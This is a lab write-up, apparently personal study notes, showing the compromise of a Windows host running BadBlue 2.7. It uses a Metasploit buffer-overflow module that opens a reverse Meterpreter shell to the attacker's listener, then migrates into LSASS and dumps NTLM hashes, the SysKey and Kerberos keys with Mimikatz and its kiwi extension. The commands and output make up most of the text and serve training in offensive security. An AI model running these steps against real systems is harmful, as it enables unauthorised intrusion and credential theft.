`Mimikatz` is a windows post exploitation tool it `allows extraction of Clear-Text Passwords, Hashes and Kerberos Tickets from memory`.

Windows store passwords in the registry in a hashed (`NTLM Hash`) format using the NTLM algorithm. The registry file is called `SAM (Security Access Manager) database file` and is located in `C:\windows\system32\config\SAM`

The `SAM` Database fle cannot be copied while OS us running.

Thw Windows NT Kernel keeps the SAM database file lokcked and as a result, attackers typically utilize in-memory (utilizing cache in RAM) technique and tools to dump `SAM ` hashes from `LSASS (Local Security Authority Service) ` also called `LSA (Local Security Authority)`

`LSASS ` This particular service also have cache of memory that will also contain these `hashes` as it interacts with the `SAM` database

`Mimikatz` interacts with the `LASASS` process and try and dump the cache of these process in order to identify the `NTLM hashes`


We can utilize `pre-compiled mimikatz executable`. Alternatively if we already have a meterpreter session on target we can utlize `inbuilt meterpreter extension Kiwi.`


NOTE - Mimikatz requires to run with elevated privileges, beause the `LSASS` process is a privileges process which runs with the system privileges
***************************************************************************************************************************************

# First We will exploit some vulnerability available and get the initial access,  I found the `BadBlue 2.7` service running, we can exploit this using metaploit moule and get the meterpreter session

Stack-based buffer overflow in the PassThru functionality in ext.dll in BadBlue 2.72b and earlier allows remote attackers to execute arbitrary code via a long query string.

root@attackdefense:~# `nmap 10.5.16.119`
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-25 19:34 IST
Nmap scan report for 10.5.16.119
Host is up (0.0015s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds
root@attackdefense:~# `nmap 10.5.16.119 -p 80 -sV`
Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-25 19:34 IST
Nmap scan report for 10.5.16.119
Host is up (0.0016s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds


msf6 > `search badblue`

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow


Interact with a module by name or index. For example info 1, use 1 or use exploit/windows/http/badblue_passthru

msf6 > `use 1`
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > `options`

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.19.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > `set RHOSTS 10.5.16.119`
RHOSTS => 10.5.16.119
msf6 exploit(windows/http/badblue_passthru) >` exploit`

[*] Started reverse TCP handler on 10.10.19.2:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.5.16.119
[*] Meterpreter session 1 opened (10.10.19.2:4444 -> 10.5.16.119:50152) at 2023-12-25 19:40:43 +0530

meterpreter > `getuid`
Server username: ATTACKDEFENSE\Administrator

meterpreter > `sysinfo`
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 

# we observe that we have 32 bit meterpreteer session on a 64 bit system, so we will migrate to another 64 bit process and `in this case we will migrate to LSASS process`

meterpreter >` ps`

Process List
============

 PID   PPID  Name                     Arch  Session  User                          Path
 ---   ----  ----                     ----  -------  ----                          ----
 0     0     [System Process]                                                      
 4     0     System                   x64   0                                      
 68    768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 88    4     Registry                 x64   0                                      
 392   4     smss.exe                 x64   0                                      
 432   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 476   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 552   544   csrss.exe                x64   0                                      
 628   620   csrss.exe                x64   1                                      
 648   544   wininit.exe              x64   0                                      
 688   620   winlogon.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 768   648   services.exe             x64   0                                      
 788   648   lsass.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 832   688   dwm.exe                  x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 856   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 860   2372  ctfmon.exe               x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\ctfmon.exe
 892   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 912   768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 932   688   fontdrvhost.exe          x64   1        Font Driver Host\UMFD-1       C:\Windows\System32\fontdrvhost.exe
 936   648   fontdrvhost.exe          x64   0        Font Driver Host\UMFD-0       C:\Windows\System32\fontdrvhost.exe
 1028  1368  winlogon.exe             x64   3        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 1032  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1112  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1140  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1148  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1184  1028  dwm.exe                  x64   3        Window Manager\DWM-3          C:\Windows\System32\dwm.exe
 1208  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1264  1368  csrss.exe                x64   3                                      
 1344  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1380  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1388  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1400  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1432  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1464  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1472  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1480  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1592  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1628  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1640  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1664  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1688  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1704  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1756  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1764  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1784  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1832  1028  LogonUI.exe              x64   3        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 1888  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1980  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2072  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2080  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2120  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2284  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2348  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2372  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2420  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2428  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2532  768   spoolsv.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2644  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2652  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2684  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2704  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2716  768   LiteAgent.exe            x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 2784  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 2792  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2800  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2808  768   svchost.exe              x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2984  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3144  1028  fontdrvhost.exe          x64   3        Font Driver Host\UMFD-3       C:\Windows\System32\fontdrvhost.exe
 3348  1032  rdpclip.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\rdpclip.exe
 3436  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3456  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3544  4848  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 3596  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3696  768   svchost.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 3808  4848  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 3812  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3848  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 3856  768   vds.exe                  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
 3908  2120  sihost.exe               x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\sihost.exe
 3924  768   svchost.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\svchost.exe
 3944  768   svchost.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\svchost.exe
 3976  1628  taskhostw.exe            x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\taskhostw.exe
 4120  3716  explorer.exe             x64   1        ATTACKDEFENSE\Administrator   C:\Windows\explorer.exe
 4236  4120  badblue.exe              x86   1        ATTACKDEFENSE\Administrator   C:\Program Files (x86)\BadBlue\EE\badblue.exe
 4268  1628  taskhostw.exe            x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\taskhostw.exe
 4324  912   ShellExperienceHost.exe  x64   1        ATTACKDEFENSE\Administrator   C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
 4436  912   SearchUI.exe             x64   1        ATTACKDEFENSE\Administrator   C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe
 4536  912   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 4616  4848  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 4668  912   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 4848  4164  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 4884  768   svchost.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 4956  912   RuntimeBroker.exe        x64   1        ATTACKDEFENSE\Administrator   C:\Windows\System32\RuntimeBroker.exe
 5152  4848  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 5412  4848  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 5556  4848  firefox.exe              x64   1        ATTACKDEFENSE\Administrator   C:\Program Files\Mozilla Firefox\firefox.exe
 5792  912   WmiPrvSE.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 5796  768   svchost.exe              x64   0                                      
 5888  768   msdtc.exe                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 6040  768   amazon-ssm-agent.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe

meterpreter > `pgrep lsass`
788
meterpreter > `migrate 788`
[*] Migrating from 4236 to 788...
[*] Migration completed successfully.
meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM
meterpreter > `sysinfo`
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x64/windows
meterpreter > 

# We will now utilize meterpreter in-built Mimikatz extension `kiwi`

meterpreter > `load kiwi`
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > `?`

Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_livessp          Retrieve Live SSP creds
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)

meterpreter > 

# So we will simply dunmp all crdentials, We get the NTLM hash for Adminstrator user

meterpreter > `creds_all`
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain         NTLM                              SHA1
--------       ------         ----                              ----
Administrator  ATTACKDEFENSE  e3c61a68f1b89ee6c8ba9507378dc88d  fa62275e30d286c09d30d8fece82664eb34323ef

wdigest credentials
===================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
ATTACKDEFENSE$  WORKGROUP      (null)
Administrator   ATTACKDEFENSE  (null)

kerberos credentials
====================

Username        Domain         Password
--------        ------         --------
(null)          (null)         (null)
Administrator   ATTACKDEFENSE  (null)
attackdefense$  WORKGROUP      (null)

# We can also dump All the hashes for all suer from SAM file, we get the NTLM hash for student and other users
# Also we got the `Syskey`, all the modern windows version have the SAM database encrypted with this sys key

meterpreter > `lsa_dump_sam`
[+] Running as SYSTEM
[*] Dumping SAM
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

******************************************************************************************************************************************

# Dumping hashes using mimikatz executable

meterpreter > `pwd`
C:\Program Files (x86)\BadBlue\EE
meterpreter > `cd /`
meterpreter > `pwd`
C:\
meterpreter > `mkdir temp`
Creating directory: temp
meterpreter > `cd temp`
meterpreter > `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
[*] uploading  : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
[*] uploaded   : /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -> mimikatz.exe
meterpreter > `ls`
Listing: C:\temp
================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100777/rwxrwxrwx  1309448  fil   2023-12-25 20:45:10 +0530  mimikatz.exe

meterpreter > 

# Now we can run mimikatz executable

meterpreter >` shell`
Process 2736 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\temp>`.\mimikatz.exe `       
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 

# we can first check and confirm that we have elevated privileges as mimikatz requires

mimikatz # `privilege::debug`
Privilege '20' OK

mimikatz # 

# We can now dump the SAM database hashes

mimikatz # `lsadump::sam`
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326
Local SID : S-1-5-21-3688751335-3073641799-161370460

SAMKey : 858f5bda5c99e45094a6a1387241a33d

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: e3c61a68f1b89ee6c8ba9507378dc88d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ed1f5e64aad3727f03522bbddc080d77

* Primary:Kerberos-Newer-Keys *
    Default Salt : ATTACKDEFENSEAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : f566d48c0c62f88d997e9e56b52eed1696aead09df3100982bcfc5920655da5d
      aes128_hmac       (4096) : bf0ca9e206e82ce481c818070bef0855
      des_cbc_md5       (4096) : 6d570d08df8979fe
    OldCredentials
      aes256_hmac       (4096) : 69d101a02f3f4648bf9875f10c1cd268d3f500c3253ab862222a9e1bb3740247
      aes128_hmac       (4096) : 3c3fd899f7f004ed44e9e48f868a5ddc
      des_cbc_md5       (4096) : 9b808fb9e0cbb3b5
    OlderCredentials
      aes256_hmac       (4096) : 4cbbe8ad8482ca76952b08cd9103ba91af35c9d8b21a3d49c332e072618a9fa9
      aes128_hmac       (4096) : b18addd75f8a2b106b262c7b5e517623
      des_cbc_md5       (4096) : 7fe0c2a15eb32fcd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : ATTACKDEFENSEAdministrator
    Credentials
      des_cbc_md5       : 6d570d08df8979fe
    OldCredentials
      des_cbc_md5       : 9b808fb9e0cbb3b5


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 58f8e0214224aebc2c5f82fb7cb47ca1

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a1528cd40d99e5dfa9fa0809af998696

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3ff137e53cac32e3e3857dc89b725fd62ae4eee729c1c5c077e54e5882d8bd55
      aes128_hmac       (4096) : 15ac5054635c97d02c174ee3aa672227
      des_cbc_md5       (4096) : ce9b2cabd55df4ce

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : ce9b2cabd55df4ce


RID  : 000003f0 (1008)
User : student
  Hash NTLM: bd4ca1fbe028f3c5066467a7f6a73b0b

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : b8e5edf45f3a42335f1f4906a24a08fe

* Primary:Kerberos-Newer-Keys *
    Default Salt : EC2AMAZ-R69684Tstudent
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : bab064fdaf62216a1577f1d5cd88e162f6962b4a421d199adf4c66b61ec6ac7c
      aes128_hmac       (4096) : 42bc1d17d1236d3afc09efbeba547d2c
      des_cbc_md5       (4096) : 1a975b02a7bf15d5

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-R69684Tstudent
    Credentials
      des_cbc_md5       : 1a975b02a7bf15d5


mimikatz # 

# We can also get the logon passwords , ie that passwords user used while loggin in the system but this we can only get if system is configured to store clear text passwords in cache which is rare

# we get `* Password : (null)` for all users because system is configured to not store clear text passwords in cache which is good, otherwise we could have got them

mimikatz # `sekurlsa::logonpasswords`

Authentication Id : 0 ; 174291 (00000000:0002a8d3)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 12/25/2023 3:09:40 PM
SID               : S-1-5-21-3688751335-3073641799-161370460-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * NTLM     : e3c61a68f1b89ee6c8ba9507378dc88d
	 * SHA1     : fa62275e30d286c09d30d8fece82664eb34323ef
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : ATTACKDEFENSE
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 12/25/2023 3:09:33 PM
SID               : S-1-5-20
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 33369 (00000000:00008259)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/25/2023 3:09:33 PM
SID               : S-1-5-96-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 33341 (00000000:0000823d)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/25/2023 3:09:33 PM
SID               : S-1-5-96-0-0
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 2406638 (00000000:0024b8ee)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/25/2023 3:10:56 PM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 2406534 (00000000:0024b886)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/25/2023 3:10:56 PM
SID               : S-1-5-90-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 2402544 (00000000:0024a8f0)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/25/2023 3:10:55 PM
SID               : S-1-5-96-0-3
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/25/2023 3:09:33 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 62263 (00000000:0000f337)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/25/2023 3:09:33 PM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 62245 (00000000:0000f325)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/25/2023 3:09:33 PM
SID               : S-1-5-90-0-1
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 32286 (00000000:00007e1e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/25/2023 3:09:32 PM
SID               : 
	msv :	
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 12/25/2023 3:09:32 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : ATTACKDEFENSE$
	 * Domain   : WORKGROUP
	 * Password : (null)
	kerberos :	
	 * Username : attackdefense$
	 * Domain   : WORKGROUP
	 * Password : (null)
	ssp :	
	credman :	

mimikatz # 
